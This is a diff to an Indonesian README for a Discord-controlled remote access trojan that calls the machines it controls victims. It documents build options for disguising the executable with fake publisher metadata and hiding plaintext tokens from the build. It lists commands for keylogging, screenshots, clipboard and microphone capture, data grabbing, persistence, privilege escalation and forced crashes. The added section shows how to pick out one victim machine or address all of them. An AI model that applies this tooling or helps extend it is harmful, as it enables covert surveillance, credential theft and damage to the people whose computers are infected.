@@ -37,7 +37,7 @@ kosong.
 | flag | keterangan |
 |---|---|
 | `--token` / `--channel` | kredensial bot, dienkripsi ke config |
-| `--alias` | huruf prefix perintah, satu per mesin |
+| `--alias` | nama pendek mesin. kosong = otomatis dari nama host (`PC-KENTANQ` → `kent`) |
 | `--product` / `--company` / `--desc` / `--version` | metadata PE supaya tidak jatuh ke "unknown" |
 | `--icon` | ikon yang ikut dipasang |
 | `--compiler` | `msvc` (Nuitka) atau `pyinstaller` untuk engine lama |
@@ -51,13 +51,28 @@ menjalankan `leak_check` di akhir — token plaintext, nama modul, dan string
 ## Perintah
 
 Daftar lengkap dengan hak akses dan batasnya ada di [`docs/commands.md`](docs/commands.md).
-Ringkasnya 39 verb:
+Ringkasnya 40 verb:
 
 ```
-info sys ping sh pow x cd ls shot dl up clip keys ps kill taskkill
+who info sys ping sh pow x cd ls shot dl up clip keys ps kill taskkill
 msg notify tts volume mic block rick blackscreen wifi grab power admin bsod
 persist unpersist update sleep exit purge uninstall
 ```
+
+## Memilih mesin yang menjawab
+
+Alias dulu dibekukan waktu build (`--alias a`), jadi dua korban menjawab `!a`
+sekaligus dan tidak ada cara memilih satu. Sekarang:
+
+| bentuk | arti |
+|---|---|
+| `!kent shot` | alias mesin (otomatis dari nama host) |
+| `!6908c58a shot` | uuid8 |
+| `!@hojv shot` | pola host / user / uuid8 |
+| `!* who` | semua mesin menjawab sekaligus |
+
+`!* who` mengembalikan satu blok per mesin: uuid8, host, user, build, dan sha8
+exe — cukup untuk tahu mana build baru dan mana yang ketinggalan.
 
 ## Peta ke `truelockmc/Discord-RAT`
 
